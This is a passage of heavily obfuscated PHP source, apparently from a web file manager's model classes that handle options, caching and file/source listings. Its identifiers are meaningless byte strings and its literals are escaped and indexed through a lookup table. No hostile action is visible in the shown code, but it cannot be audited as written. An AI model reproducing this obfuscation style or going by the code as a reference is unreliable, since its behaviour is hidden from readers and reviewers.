$ë˜Òİ— = array_field_key($ë˜Òİ—, $this->field); $º³ÁˆÆ® = $this->listData($ÌŠÏÛÚŒ); if (!$º³ÁˆÆ® || !$ÌŠÏÛÚŒ) { return !1; } $ë˜Òİ— = array_merge($º³ÁˆÆ®, $ë˜Òİ—); $ë˜Òİ—[$º±ŒÄª‡[88]] = time(); return Model($this->modelType)->set($º±ŒÄª‡[474] . $ÌŠÏÛÚŒ, $ë˜Òİ—, $this->optionType); } public function remove($İû—õÁı) { if (!$İû—õÁı) { return !1; } return Model($this->modelType)->remove($_SERVER[ÔÕ±ĞšÎ][474] . $İû—õÁı, $this->optionType); } public function clear() { $˜®ÎÙ  =& $_SERVER[ÔÕ±ĞšÎ]; Model($this->modelType)->remove($˜®ÎÙ [475], $this->optionType . $˜®ÎÙ [476]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ŞÏÁÏª, $úİ©Ï¦¢) { if (!$úİ©Ï¦¢) { return !1; } $í¹èĞÀ = $this->listData(); $í¹èĞÀ = array_to_keyvalue($í¹èĞÀ, $ŞÏÁÏª); return isset($í¹èĞÀ[$úİ©Ï¦¢]) ? $í¹èĞÀ[$úİ©Ï¦¢] : !1; } public function findByName($Û®İÅìÌ) { return $this->findByKey($_SERVER[ÔÕ±ĞšÎ][32], $Û®İÅìÌ); } protected function resetData($ã‹×åéš) { $ÚÛÏöçç =& $_SERVER[ÔÕ±ĞšÎ]; $ã‹×åéš = is_array($ã‹×åéš) ? $ã‹×åéš : array(); $·ÁÄ©•á = array(); for ($Œœ’ µ¤ = 0; $Œœ’ µ¤ < count($ã‹×åéš); $Œœ’ µ¤++) { $·ÁÄ©•á[$ÚÛÏöçç[474] . $ã‹×åéš[$Œœ’ µ¤][$ÚÛÏöçç[477]]] = $ã‹×åéš[$Œœ’ µ¤]; } return Model($this->modelType)->set($·ÁÄ©•á, !1, $this->optionType); } private function getAutoName($ˆ—²Àò) { $˜ßÎ‚¬ = array_to_keyvalue($this->listData(), $_SERVER[ÔÕ±ĞšÎ][32]); if (!$˜ßÎ‚¬ || !isset($˜ßÎ‚¬[$ˆ—²Àò])) { return $ˆ—²Àò; } for ($—¹†ı‚à = 1; $—¹†ı‚à < count($˜ßÎ‚¬); $—¹†ı‚à++) { $¯°¸àÇí = $ˆ—²Àò . "\50{$—¹†ı‚à}\51"; if (!isset($˜ßÎ‚¬[$¯°¸àÇí])) { return $¯°¸àÇí; } } return $¯°¸àÇí; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Ë€êççŞ = false, $çÏ§Éè = '', $ß½ÑùÃÚ = false) { $Èïáƒ¦ì =& $_SERVER[ÔÕ±ĞšÎ]; $’µŸìËœ = $this->cacheGet($çÏ§Éè); $¦ªƒ‚õÓ = $this->optionDefault($çÏ§Éè); $¦ªƒ‚õÓ = is_array($¦ªƒ‚õÓ) ? $¦ªƒ‚õÓ : array(); if (is_array($’µŸìËœ)) { $’µŸìËœ = array_merge($¦ªƒ‚õÓ, $’µŸìËœ); return $Ë€êççŞ ? isset($’µŸìËœ[$Ë€êççŞ]) ? $’µŸìËœ[$Ë€êççŞ] : null : $’µŸìËœ; } $¸âÓ„É‚ = $this->filterWhere(array($Èïáƒ¦ì[33] => $çÏ§Éè)); $’µŸìËœ = $this->where($¸âÓ„É‚)->select(); $’µŸìËœ = array_to_keyvalue($’µŸìËœ, $Èïáƒ¦ì[97], $Èïáƒ¦ì[452]); foreach ($’µŸìËœ as $Â½©×¾ => $Ë¸ˆÅç») { if ($ß½ÑùÃÚ || in_array($Â½©×¾, $this->jsonField)) { $’µŸìËœ[$Â½©×¾] = json_decode($Ë¸ˆÅç», !0); } } $this->cacheSet($çÏ§Éè, $’µŸìËœ); $’µŸìËœ = array_merge($¦ªƒ‚õÓ, $’µŸìËœ); return $Ë€êççŞ ? $’µŸìËœ[$Ë€êççŞ] : $’µŸìËœ; } public function set($¬–Ÿ³¤, $‹ıĞà¨ = false, $æÂó«Ù¤ = '') { $´îì˜‡à =& $_SERVER[ÔÕ±ĞšÎ]; $this->cacheRemove($æÂó«Ù¤); $ê–åë… = array(); $»æ™·¥ = is_array($¬–Ÿ³¤) ? $¬–Ÿ³¤ : array($¬–Ÿ³¤ => $‹ıĞà¨); foreach ($»æ™·¥ as $–Ë¢ó „ => $»´«áÛ) { if (is_array($»´«áÛ)) { $»´«áÛ = json_encode_force($»´«áÛ); } $this->checkLength($»´«áÛ, !1, $this->tableName . $´îì˜‡à[4] . $¬–Ÿ³¤); $»´«áÛ = self::textEncode($»´«áÛ); $»æ™·¥ = array($´îì˜‡à[33] => $æÂó«Ù¤, $´îì˜‡à[97] => $–Ë¢ó „, $´îì˜‡à[452] => $»´«áÛ); $ê–åë…[] = $this->filterWhere($»æ™·¥); } if (!$ê–åë…) { return !0; } $ÔÄ£ƒ«Ğ = $this->cacheKey($´îì˜‡à[478]); CacheLock::lock($ÔÄ£ƒ«Ğ); $®ñğ¦ÚŸ = $this->addAll($ê–åë…, array(), !0); CacheLock::unlock($ÔÄ£ƒ«Ğ); return $®ñğ¦ÚŸ; } protected function optionDefault($œ–¼ÒúÃ = '') { return !1; } public function setDeep($§Ÿœ–©†, $šÃªÃ²  = false, $å……‹Ö´ = '') { $½û•¥¼¦ = explode($_SERVER[ÔÕ±ĞšÎ][10], $§Ÿœ–©†); $‰”½ó•ï = $this->get(); array_set_value($‰”½ó•ï, $§Ÿœ–©†, $šÃªÃ² ); $this->set($½û•¥¼¦[0], $‰”½ó•ï[$½û•¥¼¦[0]], $å……‹Ö´); } public function remove($¸Œˆµ™ô, $¬˜¼ŠŸÙ = '') { $ğüÄ‡´ =& $_SERVER[ÔÕ±ĞšÎ]; $this->cacheRemove($¬˜¼ŠŸÙ); $©‰Üç§ = $this->filterWhere(array($ğüÄ‡´[97] => $¸Œˆµ™ô, $ğüÄ‡´[33] => $¬˜¼ŠŸÙ)); if (is_null($¸Œˆµ™ô)) { unset($©‰Üç§[$ğüÄ‡´[97]]); } return $this->where($©‰Üç§)->delete(); } public function cacheSet($²”úô÷Ó, $Œ¼ıİÜ× = false) { return Cache::set($this->cacheKey($²”úô÷Ó), $Œ¼ıİÜ×); } public function cacheGet($Ìİá¡‡˜) { return Cache::get($this->cacheKey($Ìİá¡‡˜)); } public function cacheRemove($‹ÊÖ÷¢Ô) { return Cache::remove($this->cacheKey($‹ÊÖ÷¢Ô)); } protected function filterWhere($ª—í¢€) { return $ª—í¢€; } protected function cacheKey($ ¬ƒ£Ì) { return $ ¬ƒ£Ì; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\x72\143\x65"; protected $tableMeta = array("\164\141\142\154\x65\x4e\x61\x6d\145" => "\x69\x6f\137\163\x6f\x75\162\x63\x65\137\x6d\145\x74\x61", "\155\x65\x74\x61\106\151\145\x6c\144" => "\163\x6f\165\x72\143\145\x49\x44"); protected $dataAuto = array(array("\155\157\144\x69\146\x79\124\151\155\145", "\164\151\x6d\145", "\151\156\163\145\x72\164", "\x66\165\x6e\x63\x74\151\x6f\x6e"), array("\x63\162\x65\x61\164\145\124\x69\155\145", "\x74\151\x6d\145", "\x69\x6e\163\x65\162\x74", "\146\x75\156\x63\x74\151\x6f\x6e"), array("\x76\151\145\167\124\151\155\x65", "\164\151\x6d\x65", "\x69\x6e\163\145\x72\x74", "\146\165\x6e\x63\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Ö–®ŞçÜ) { return $this->listSource(array($_SERVER[ÔÕ±ĞšÎ][479] => $Ö–®ŞçÜ)); } public function typeName($Úã˜ú°ò) { static $ÀÆñŠŠ = array(self::TYPE_SYSTEM => "\163\x79\163\x74\x65\x6d", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\147\162\x6f\x75\160"); return $ÀÆñŠŠ[$Úã˜ú°ò . $_SERVER[ÔÕ±ĞšÎ][12]]; } public function sourceListInfo($Î…Ë‚–ó, $§Í¼ÆÙ = false) { $™ñËíŒ‚ =& $_SERVER[ÔÕ±ĞšÎ]; $Î…Ë‚–ó = $Î…Ë‚–ó ? $Î…Ë‚–ó : array(); $Î…Ë‚–ó = array_filter(array_unique($Î…Ë‚–ó)); if (!$Î…Ë‚–ó) { return array(); } $±İ„ƒ¿± = $this->where(array($™ñËíŒ‚[193] => array($™ñËíŒ‚[7], $Î…Ë‚–ó)))->select(); $this->_listDataApply($±İ„ƒ¿±, $§Í¼ÆÙ); return array_to_keyvalue($±İ„ƒ¿±, $™ñËíŒ‚[193]); } public function pathInfoFilter(&$úãºÓµ) { $¨›Çï =& $_SERVER[ÔÕ±ĞšÎ]; static $‹¸³¶‘ = false; static $Ö¯ÁÇöÂ = false; static $·‚±¹¿ = false; if (!$‹¸³¶‘) { $¡ò¿Ø«´ = $¨›Çï[480]; $¡ò¿Ø«´ .= $¨›Çï[481]; $¡ò¿Ø«´ .= $¨›Çï[482]; $û“¶øñ = $¨›Çï[483]; $£„¾È¤” = explode($¨›Çï[50], $û“¶øñ); $‹¸³¶‘ = explode($¨›Çï[50], $¡ò¿Ø«´); $Ö¯ÁÇöÂ = array(); foreach ($‹¸³¶‘ as $ıõ›ÎÒ) { if (in_array($ıõ›ÎÒ, $£„¾È¤”)) { continue; } $Ö¯ÁÇöÂ[] = $ıõ›ÎÒ; } $·‚±¹¿ = explode($¨›Çï[50], $¨›Çï[484]); } foreach ($·‚±¹¿ as $óÂòÕô©) { if (isset($úãºÓµ[$óÂòÕô©])) { $úãºÓµ[$óÂòÕô©] = intval($úãºÓµ[$óÂòÕô©]); } } $úãºÓµ[$¨›Çï[87]] = $¨›Çï[485] . $úãºÓµ[$¨›Çï[193]] . $¨›Çï[486]; $úãºÓµ[$¨›Çï[33]] = $úãºÓµ[$¨›Çï[487]] == 1 ? $¨›Çï[78] : $¨›Çï[232]; $úãºÓµ[$¨›Çï[190]] = $this->typeName($úãºÓµ[$¨›Çï[190]]); if ($úãºÓµ[$¨›Çï[487]] != 1) { $úãºÓµ[$¨›Çï[169]] = $úãºÓµ[$¨›Çï[488]]; unset($úãºÓµ[$¨›Çï[488]]); } $²ü­ü = $‹¸³¶‘; if (isset($úãºÓµ[$¨›Çï[489]]) && $úãºÓµ[$¨›Çï[489]][$¨›Çï[490]] == -1) { $²ü­ü = $Ö¯ÁÇöÂ; } $úãºÓµ = array_field_key($úãºÓµ, $²ü­ü); return $úãºÓµ; } public function listUserFav() { $ŠŒ£©ƒï =& $_SERVER[ÔÕ±ĞšÎ]; $È–™Ùï = Model($ŠŒ£©ƒï[491])->listData(); $à®·Ì‰œ = array_filter_by_field($È–™Ùï, $ŠŒ£©ƒï[33], $ŠŒ£©ƒï[492]); $à®·Ì‰œ = array_to_keyvalue($à®·Ì‰œ, $ŠŒ£©ƒï[12], $ŠŒ£©ƒï[87]); if ($à®·Ì‰œ) { $éí¨Ÿµ = $this->listSource(array($ŠŒ£©ƒï[493] => array($ŠŒ£©ƒï[494], $à®·Ì‰œ))); } $éí¨Ÿµ = array_to_keyvalue($éí¨Ÿµ[$ŠŒ£©ƒï[447]], $ŠŒ£©ƒï[193]); foreach ($È–™Ùï as &$å»À–‘³) { $å»À–‘³ = array($ŠŒ£©ƒï[495] => $å»À–‘³[$ŠŒ£©ƒï[477]], $ŠŒ£©ƒï[496] => $å»À–‘³[$ŠŒ£©ƒï[32]], $ŠŒ£©ƒï[497] => $å»À–‘³[$ŠŒ£©ƒï[87]], $ŠŒ£©ƒï[498] => $å»À–‘³[$ŠŒ£©ƒï[33]], $ŠŒ£©ƒï[499] => $å»À–‘³[$ŠŒ£©ƒï[233]], $ŠŒ£©ƒï[500] => $å»À–‘³[$ŠŒ£©ƒï[88]]); if ($å»À–‘³[$ŠŒ£©ƒï[33]] == $ŠŒ£©ƒï[492] && $éí¨Ÿµ[$å»À–‘³[$ŠŒ£©ƒï[87]]]) { $å»À–‘³[$ŠŒ£©ƒï[90]] = $éí¨Ÿµ[$å»À–‘³[$ŠŒ£©ƒï[87]]]; } } unset($å»À–‘³); return $È–™Ùï; } public function listUserTag($à™Ö‚µ) { $–×ÀÉ Ö =& $_SERVER[ÔÕ±ĞšÎ]; if ($à™Ö‚µ && !is_array($à™Ö‚µ)) { $à™Ö‚µ = array($à™Ö‚µ); } $ÊáŞúÅù = Model($–×ÀÉ Ö[501])->listData(); $İïŒ‚µ¢ = array(); $ßú¨Ù¸¬ = array(); foreach ($ÊáŞúÅù as $¥§“Šªç) { $’¯éûè½ = $¥§“Šªç[$–×ÀÉ Ö[87]]; if (!$’¯éûè½) { continue; } if (!isset($ßú¨Ù¸¬[$’¯éûè½])) { $ßú¨Ù¸¬[$’¯éûè½] = array(); } $ßú¨Ù¸¬[$’¯éûè½][] = $¥§“Šªç[$–×ÀÉ Ö[502]]; $İïŒ‚µ¢[$¥§“Šªç[$–×ÀÉ Ö[87]]] = $¥§“Šªç; } $¼›€Û®é = array(); $ğêÛË = array(); $†óÃòƒ = array(); foreach ($ßú¨Ù¸¬ as $€ˆŒÜ¢† => $¶®ˆè‹Ş) { $èÛ‹Ÿ³ñ = !0; if (!$à™Ö‚µ) { $¼›€Û®é[] = $€ˆŒÜ¢†; continue; } foreach ($à™Ö‚µ as $Ò´Õñ¶ñ) { if (!in_array($Ò´Õñ¶ñ, $¶®ˆè‹Ş)) { $èÛ‹Ÿ³ñ = !1; break; } } if (!$èÛ‹Ÿ³ñ) { continue; } if (!is_numeric($€ˆŒÜ¢†)) { $øŒöŒÀô = $İïŒ‚µ¢[$€ˆŒÜ¢†]; $¸Æ—æš = array($–×ÀÉ Ö[32] => $øŒöŒÀô[$–×ÀÉ Ö[32]], $–×ÀÉ Ö[87] => $øŒöŒÀô[$–×ÀÉ Ö[87]], $–×ÀÉ Ö[33] => $øŒöŒÀô[$–×ÀÉ Ö[33]], $–×ÀÉ Ö[90] => array($–×ÀÉ Ö[503] => 1), $–×ÀÉ Ö[234] => !0); if ($øŒöŒÀô[$–×ÀÉ Ö[33]] == $–×ÀÉ Ö[232]) { $†óÃòƒ[] = $¸Æ—æš; } if ($øŒöŒÀô[$–×ÀÉ Ö[33]] == $–×ÀÉ Ö[78]) { $ğêÛË[] = $¸Æ—æš; } continue; } $¼›€Û®é[] = $€ˆŒÜ¢†; } if ($¼›€Û®é) { $İÕ½±“í = $this->listSource(array($–×ÀÉ Ö[493] => array($–×ÀÉ Ö[494], $¼›€Û®é))); } $İÕ½±“í = $İÕ½±“í ? $İÕ½±“í : array($–×ÀÉ Ö[85] => array(), $–×ÀÉ Ö[86] => array()); $İÕ½±“í[$–×ÀÉ Ö[85]] = array_merge($İÕ½±“í[$–×ÀÉ Ö[85]], $ğêÛË); $İÕ½±“í[$–×ÀÉ Ö[86]] = array_merge($İÕ½±“í[$–×ÀÉ Ö[86]], $†óÃòƒ); if (isset($İÕ½±“í[$–×ÀÉ Ö[444]]) && count($¼›€Û®é) == $İÕ½±“í[$–×ÀÉ Ö[444]][$–×ÀÉ Ö[445]]) { return $İÕ½±“í; } $¥ØàìØ« = array(); $´ş­è±ˆ = array_to_keyvalue($İÕ½±“í[$–×ÀÉ Ö[85]], $–×ÀÉ Ö[12], $–×ÀÉ Ö[193]); $½û å¿ = array_to_keyvalue($İÕ½±“í[$–×ÀÉ Ö[86]], $–×ÀÉ Ö[12], $–×ÀÉ Ö[193]); $öË¹÷²£ = array_merge($½û å¿, $´ş­è±ˆ); foreach ($¼›€Û®é as $’¯éûè½) { if (!in_array($’¯éûè½, $öË¹÷²£)) { $¥ØàìØ«[] = $’¯éûè½; } } if ($¥ØàìØ«) { Model($–×ÀÉ Ö[504])->removeBySource($¥ØàìØ«); } return $İÕ½±“í; } public function listUserRecycle() { $Àñ­–î§ =& $_SERVER[ÔÕ±ĞšÎ]; $Ì¯İê¥§ = Model($Àñ­–î§[505])->listData(); if (!$Ì¯İê¥§) { return array(); } $“Áê´Ÿ× = array($Àñ­–î§[493] => array($Àñ­–î§[494], $Ì¯İê¥§), $Àñ­–î§[506] => 1); return $this->listSource($“Áê´Ÿ×); } public function listSource($ªïù¸ş…, $²ÙéûÙŒ = 3000, $Ù˜‚×· = false) { $ÉÒàÏã¤ =& $_SERVER[ÔÕ±ĞšÎ]; if (!isset($ªïù¸ş…[$ÉÒàÏã¤[507]])) { $ªïù¸ş…[$ÉÒàÏã¤[507]] = 0; } if (isset($ªïù¸ş…[$ÉÒàÏã¤[192]]) && $ªïù¸ş…[$ÉÒàÏã¤[192]] == $ÉÒàÏã¤[230]) { $ªïù¸ş…[$ÉÒàÏã¤[488]] = array($ÉÒàÏã¤[508], $ÉÒàÏã¤[12]); } $ŠÒ³šÎ = $ÉÒàÏã¤[509]; $Œ¡ìĞßú = $this->field($ŠÒ³šÎ)->_makeOrder()->where($ªïù¸ş…)->selectPage($²ÙéûÙŒ); $this->_listPageCheck($Œ¡ìĞßú, $ŠÒ³šÎ, $ªïù¸ş…); $this->_listDataApply($Œ¡ìĞßú[$ÉÒàÏã¤[447]], $Ù˜‚×·); $this->_listMake($Œ¡ìĞßú); return $Œ¡ìĞßú; } private function _listPageCheck(&$™›€ìœ, $ä®‚‹’´, $–ì®–) { $¡Ù·Âöõ =& $_SERVER[ÔÕ±ĞšÎ]; if (!is_array($™›€ìœ[$¡Ù·Âöõ[444]])) { return; } $˜‹Úá„± = $™›€ìœ[$¡Ù·Âöõ[444]]; if ($˜‹Úá„±[$¡Ù·Âöõ[446]] <= 1) { return; } if ($˜‹Úá„±[$¡Ù·Âöõ[445]] >= 100000) { return; } if (Model($¡Ù·Âöõ[510])->get($¡Ù·Âöõ[511]) != $¡Ù·Âöõ[512]) { return; } $ä®‚‹’´ = str_replace(array($¡Ù·Âöõ[53], $¡Ù·Âöõ[419], $¡Ù·Âöõ[287]), $¡Ù·Âöõ[12], $ä®‚‹’´); $ä®‚‹’´ = $¡Ù·Âöõ[513] . str_replace($¡Ù·Âöõ[50], $¡Ù·Âöõ[514], $ä®‚‹’´) . $¡Ù·Âöõ[515]; $ÆêáÀö¿ = $¡Ù·Âöõ[516]; $ÆêáÀö¿ = $ÆêáÀö¿ . $¡Ù·Âöõ[517]; $ô†«·Ì = $˜‹Úá„±[$¡Ù·Âöõ[441]] * ($˜‹Úá„±[$¡Ù·Âöõ[430]] - 1) . $¡Ù·Âöõ[50] . $˜‹Úá„±[$¡Ù·Âöõ[441]]; $é»Ê›Ë÷ = $this->_makeOrder(!0); $•ƒÊª‚˜ = $¡Ù·Âöõ[513] . str_replace($¡Ù·Âöõ[50], $¡Ù·Âöõ[514], $é»Ê›Ë÷[0]); if (strpos($•ƒÊª‚˜, $¡Ù·Âöõ[518])) { $•ƒÊª‚˜ = str_replace($¡Ù·Âöõ[518], $¡Ù·Âöõ[519], $•ƒÊª‚˜); } else { $•ƒÊª‚˜ .= $¡Ù·Âöõ[520] . $é»Ê›Ë÷[1]; } $¿ò±„Â† = array(); foreach ($–ì®– as $ÅõòÉÙù => $âÅûê¹Ì) { $¿ò±„Â†[$¡Ù·Âöõ[513] . $ÅõòÉÙù] = $âÅûê¹Ì; } $this->alias($¡Ù·Âöõ[521])->field($ä®‚‹’´)->limit($ô†«·Ì)->order($•ƒÊª‚˜); $ß·¹·“ñ = $this->join($ÆêáÀö¿)->where($¿ò±„Â†)->select(); if ($ß·¹·“ñ) { $™›€ìœ[$¡Ù·Âöõ[447]] = $ß·¹·“ñ; } } protected function _makeOrder($ã‹¡ôµ = false) { $ÀóÈ’™ =& $_SERVER[ÔÕ±ĞšÎ]; $úá‡Æø = Model($ÀóÈ’™[522])->get($ÀóÈ’™[523]); $Â…ĞÉ®ñ = Model($ÀóÈ’™[522])->get($ÀóÈ’™[524]); $Ï¾œ˜ª = array($ÀóÈ’™[525] => $ÀóÈ’™[526], $ÀóÈ’™[527] => $ÀóÈ’™[528]); $÷î£ª¾ = array($ÀóÈ’™[32] => $ÀóÈ’™[32], $ÀóÈ’™[79] => $ÀóÈ’™[79], $ÀóÈ’™[169] => $ÀóÈ’™[488], $ÀóÈ’™[529] => $ÀóÈ’™[529], $ÀóÈ’™[530] => $ÀóÈ’™[531], $ÀóÈ’™[233] => $ÀóÈ’™[233], $ÀóÈ’™[88] => $ÀóÈ’™[88]); $¹§êÄˆÔ = Input::get($ÀóÈ’™[532], $ÀóÈ’™[7], $úá‡Æø, array_keys($÷î£ª¾)); $ØÍØ¯¼Ü = Input::get($ÀóÈ’™[533], $ÀóÈ’™[7], $Â…ĞÉ®ñ, array_keys($Ï¾œ˜ª)); if (!in_array($¹§êÄˆÔ, array_keys($÷î£ª¾))) { $¹§êÄˆÔ = $ÀóÈ’™[32]; } if (!in_array($ØÍØ¯¼Ü, array_keys($Ï¾œ˜ª))) { $¹§êÄˆÔ = $ÀóÈ’™[525]; } if ($¹§êÄˆÔ == $ÀóÈ’™[32]) { } $®…ò¥ê¢ = $ÀóÈ’™[534] . $÷î£ª¾[$¹§êÄˆÔ] . $ÀóÈ’™[53] . $Ï¾œ˜ª[$ØÍØ¯¼Ü]; $®…ò¥ê¢ = rtrim(trim($®…ò¥ê¢), $ÀóÈ’™[50]); if ($ã‹¡ôµ) { return array($®…ò¥ê¢, $Ï¾œ˜ª[$ØÍØ¯¼Ü]); } return $this->order($®…ò¥ê¢); } protected function _listDataApplyItem($Ñ Ó®ºõ, $ìÄ«°ÖŠ = false) { $ìë¯†©ù = array($Ñ Ó®ºõ); $this->_listDataApply($ìë¯†©ù, $ìÄ«°ÖŠ); return $ìë¯†©ù[0]; } protected function _listDataApply(&$Û—ã™ÀÎ, $„„Èº = false) { $¿øœúø =& $_SERVER[ÔÕ±ĞšÎ]; if (!$Û—ã™ÀÎ) { $Û—ã™ÀÎ = array(); return; } $±½Ê íÁ = array_to_keyvalue($Û—ã™ÀÎ, $¿øœúø[12], $¿øœúø[193]); $±½Ê íÁ = array_unique($±½Ê íÁ); $this->_listSourceCache($Û—ã™ÀÎ); if (!$„„Èº) { $this->_listAppendMeta($Û—ã™ÀÎ, $±½Ê íÁ); $this->_listAppendFileMeta($Û—ã™ÀÎ, $±½Ê íÁ); $this->_listAppendChildren($Û—ã™ÀÎ, $±½Ê íÁ); } $this->_listAppendPath($Û—ã™ÀÎ); $this->_listAppendAuth($Û—ã™ÀÎ); $this->_listAppendSourceInfo($Û—ã™ÀÎ, $±½Ê íÁ); $this->_listAppendUser($Û—ã™ÀÎ); $this->_listFilterInfo($Û—ã™ÀÎ, $„„Èº); $this->_listAppendAuthSecret($Û—ã™ÀÎ); } protected function _listSourceCache($¤¨ˆ˜´) { $Ã¼‘ëŒ =& $_SERVER[ÔÕ±ĞšÎ]; foreach ($¤¨ˆ˜´ as $Ù¦èùÑ²) { self::$cacheSourceInfo[$Ã¼‘ëŒ[535] . $Ù¦èùÑ²[$Ã¼‘ëŒ[193]]] = $Ù¦èùÑ²; } } protected function _listFilterInfo(&$šØƒÜƒ, $‡‹ßğ‡ = false) { $Ï£ØÎœ¿ =& $_SERVER[ÔÕ±ĞšÎ]; foreach ($šØƒÜƒ as &$©Çøé¸) { $©Çøé¸ = $this->pathInfoFilter($©Çøé¸); self::$cachePathInfo[$Ï£ØÎœ¿[536] . intval($‡‹ßğ‡) . $Ï£ØÎœ¿[464] . $©Çøé¸[$Ï£ØÎœ¿[193]]] = $©Çøé¸; } unset($©Çøé¸); } protected function _listMake(&$ìÜà×¤ ) { $²“êÜœ =& $_SERVER[ÔÕ±ĞšÎ]; $ìÜà×¤ [$²“êÜœ[85]] = array(); $ìÜà×¤ [$²“êÜœ[86]] = array(); foreach ($ìÜà×¤ [$²“êÜœ[447]] as $–ÏŞëõ™) { $¨‘©…¼ = $–ÏŞëõ™[$²“êÜœ[487]] == 1 ? $²“êÜœ[85] : $²“êÜœ[86]; $ìÜà×¤ [$¨‘©…¼][] = $–ÏŞëõ™; } unset($ìÜà×¤ [$²“êÜœ[447]]); } protected function _listAppendMeta(&$î•–ƒû, $é•Øíñ…) { $¾©Æ‘”ã =& $_SERVER[ÔÕ±ĞšÎ]; $şşçõÔ = array($¾©Æ‘”ã[493] => array($¾©Æ‘”ã[494], $é•Øíñ…)); $¼î¥Šú— = Model($¾©Æ‘”ã[537])->field($¾©Æ‘”ã[538])->where($şşçõÔ)->select(); if (!$¼î¥Šú—) { return; } $ôÚğÇæ¥ = array($¾©Æ‘”ã[539], $¾©Æ‘”ã[540], $¾©Æ‘”ã[519]); $…¯ö½·ş = array(); foreach ($¼î¥Šú— as $íşÒÂ½) { if (!isset($…¯ö½·ş[$íşÒÂ½[$¾©Æ‘”ã[193]]])) { $…¯ö½·ş[$íşÒÂ½[$¾©Æ‘”ã[193]]] = array(); } if (in_array($íşÒÂ½[$¾©Æ‘”ã[97]], $ôÚğÇæ¥)) { continue; } $…¯ö½·ş[$íşÒÂ½[$¾©Æ‘”ã[193]]][$íşÒÂ½[$¾©Æ‘”ã[97]]] = $íşÒÂ½[$¾©Æ‘”ã[452]]; } foreach ($î•–ƒû as &$ÇäÛñ½ó) { $ÇäÛñ½ó[$¾©Æ‘”ã[541]] = !1; if (isset($…¯ö½·ş[$ÇäÛñ½ó[$¾©Æ‘”ã[193]]])) { $ÇäÛñ½ó[$¾©Æ‘”ã[541]] = $…¯ö½·ş[$ÇäÛñ½ó[$¾©Æ‘”ã[193]]]; } if ($this->fileIsLock($ÇäÛñ½ó) && $ÇäÛñ½ó[$¾©Æ‘”ã[489]]) { $œß€ÚÌ› = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÇäÛñ½ó[$¾©Æ‘”ã[489]][$¾©Æ‘”ã[490]] = AuthModel::authDisable($ÇäÛñ½ó[$¾©Æ‘”ã[489]][$¾©Æ‘”ã[490]], $œß€ÚÌ›); $ÇäÛñ½ó[$¾©Æ‘”ã[489]][$¾©Æ‘”ã[542]][$¾©Æ‘”ã[489]] = $ÇäÛñ½ó[$¾©Æ‘”ã[489]][$¾©Æ‘”ã[490]]; } } unset($ÇäÛñ½ó); } protected function _listAppendFileMeta(&$ëê˜‡úÄ, $ûßÒåûØ) { $ãËŠ°Í° =& $_SERVER[ÔÕ±ĞšÎ]; $¨ÃË¾ùÎ = array_to_keyvalue($ëê˜‡úÄ, $ãËŠ°Í°[12], $ãËŠ°Í°[543]); $¨ÃË¾ùÎ = array_filter(array_unique($¨ÃË¾ùÎ)); if (!$¨ÃË¾ùÎ) { return; } $œÛŠŞ = array($ãËŠ°Í°[544] => array($ãËŠ°Í°[494], $¨ÃË¾ùÎ)); $ç’¡·ˆ = $ãËŠ°Í°[545]; $ìÆñÆ‚Ä = Model($ãËŠ°Í°[546])->field($ç’¡·ˆ)->where($œÛŠŞ)->select(); $ìÆñÆ‚Ä = array_to_keyvalue($ìÆñÆ‚Ä, $ãËŠ°Í°[543]); $üÑÀÕ…È = Model($ãËŠ°Í°[547])->field($ãËŠ°Í°[548])->where($œÛŠŞ)->select(); $üÑÀÕ…È = $üÑÀÕ…È ? $üÑÀÕ…È : array(); $æ˜Â¡ŒÃ = array(); foreach ($üÑÀÕ…È as $†şÏ³˜) { if (!isset($æ˜Â¡ŒÃ[$†şÏ³˜[$ãËŠ°Í°[543]]])) { $æ˜Â¡ŒÃ[$†şÏ³˜[$ãËŠ°Í°[543]]] = array(); } $æ˜Â¡ŒÃ[$†şÏ³˜[$ãËŠ°Í°[543]]][$†şÏ³˜[$ãËŠ°Í°[97]]] = $†şÏ³˜[$ãËŠ°Í°[452]]; } foreach ($ëê˜‡úÄ as &$‰Àâ¦˜ş) { $¿‡äß = $‰Àâ¦˜ş[$ãËŠ°Í°[543]]; if (!$¿‡äß || !is_array($ìÆñÆ‚Ä[$¿‡äß])) { continue; } $Æ°ıÔœĞ = $ìÆñÆ‚Ä[$¿‡äß]; $Æ°ıÔœĞ[$ãËŠ°Í°[79]] = $‰Àâ¦˜ş[$ãËŠ°Í°[79]]; $Æ°ıÔœĞ[$ãËŠ°Í°[32]] = $‰Àâ¦˜ş[$ãËŠ°Í°[32]]; if (!$Æ°ıÔœĞ[$ãËŠ°Í°[549]]) { Model($ãËŠ°Í°[546])->fileMd5Check($Æ°ıÔœĞ); } if (!isset(self::$cacheFileInfo[$ãËŠ°Í°[550] . $¿‡äß])) { self::$cacheFileInfo[$ãËŠ°Í°[550] . $¿‡äß] = array_merge(array(), $Æ°ıÔœĞ); } unset($ìÆñÆ‚Ä[$¿‡äß][$ãËŠ°Í°[87]]); $¨˜ó»æï = isset($æ˜Â¡ŒÃ[$¿‡äß]) && is_array($æ˜Â¡ŒÃ[$¿‡äß]) ? $æ˜Â¡ŒÃ[$¿‡äß] : array(); $‰Àâ¦˜ş[$ãËŠ°Í°[170]] = array_merge($¨˜ó»æï, $ìÆñÆ‚Ä[$¿‡äß]); if (isset($‰Àâ¦˜ş[$ãËŠ°Í°[170]][$ãËŠ°Í°[184]])) { $‰Àâ¦˜ş[$ãËŠ°Í°[184]] = json_decode($‰Àâ¦˜ş[$ãËŠ°Í°[170]][$ãËŠ°Í°[184]], !0); unset($‰Àâ¦˜ş[$ãËŠ°Í°[170]][$ãËŠ°Í°[184]]); } } unset($‰Àâ¦˜ş); } protected function _listAppendSourceInfo(&$±º  ò, $¹ ß¢Ã) { $®Å†¥ =& $_SERVER[ÔÕ±ĞšÎ]; $Æ½áºö = Model($®Å†¥[551])->listData(); $¸ÆÎ¼ = Model($®Å†¥[501])->listData(); $ıò‡ôªñ = Model($®Å†¥[491])->listData(); 